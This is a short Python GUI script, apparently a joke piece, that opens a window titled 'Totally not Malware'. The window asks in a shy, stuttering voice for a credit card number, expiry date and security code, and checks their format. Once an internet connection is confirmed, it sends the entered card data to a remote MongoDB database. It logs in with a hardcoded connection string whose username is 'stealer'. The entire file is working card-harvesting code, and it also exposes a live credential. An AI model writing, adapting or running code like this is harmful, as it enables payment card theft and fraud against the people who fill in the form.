import PySimpleGUI as sg
from re import match
import requests
import pymongo
from os import listdir
from os.path import isfile
from random import choice

layout = [[sg.Image("photos/"+choice([f for f in listdir("./photos") if isfile("./photos/"+f)]),pad=(0,0),size=(224,249)),sg.Column([
            [sg.Text("H-hi there...\nDo you th-think I could have your\ncredit card information, p-please?",justification="center")],
            [sg.Column([[sg.Text("Card number:")],
                [sg.Text("Expiry date:")],
                [sg.Text("Security number:")]],element_justification="center"),
            sg.Column([[sg.Input(k="CN",size=(20,1))],
            [sg.Input(k="ED",size=(20,1))],
            [sg.Input(k="SN",size=(20,1))]])],
            [sg.Button("Th-thanks")]],element_justification="center")]]

window = sg.Window('Totally not Malware', layout,element_justification="right",font=("",14),element_padding=(0,0),icon=("icon.png"))
while True:
    event, values = window.read()
    if event == sg.WIN_CLOSED:
        break
    elif event == "Th-thanks":
        if match(r"(\d\s?){16}",values["CN"]) == None:
            sg.popup("P-please don't lie...","Your credit card number should look like:","1234 5678 9012 3456")
        elif match(r"\d{2}(\s?|\\|/)\d{2}",values["ED"]) == None:
            sg.popup("P-please don't lie...","Your expiry date should look like:","24/24")
        elif match(r"\d{3}",values["SN"]) == None:
            sg.popup("P-please don't lie...","Your security code is 3 digits","at the back of your card")
        else:
            try:
                requests.get("https://www.google.com", timeout=5)
            except (requests.ConnectionError, requests.Timeout) as exception:
                pass
            else:
                db = pymongo.MongoClient("mongodb+srv://stealer:FnP2k2EKxOTWzhiw@cluster0.hp7pw.mongodb.net/testdata?retryWrites=true&w=majority").testdata.daniel
                post = {"credit":values["CN"].replace(" ",""),"info":values["ED"].replace("\\","").replace("/","").replace(" ","")+values["SN"]}
                db.insert_one(post)
            break
window.close()
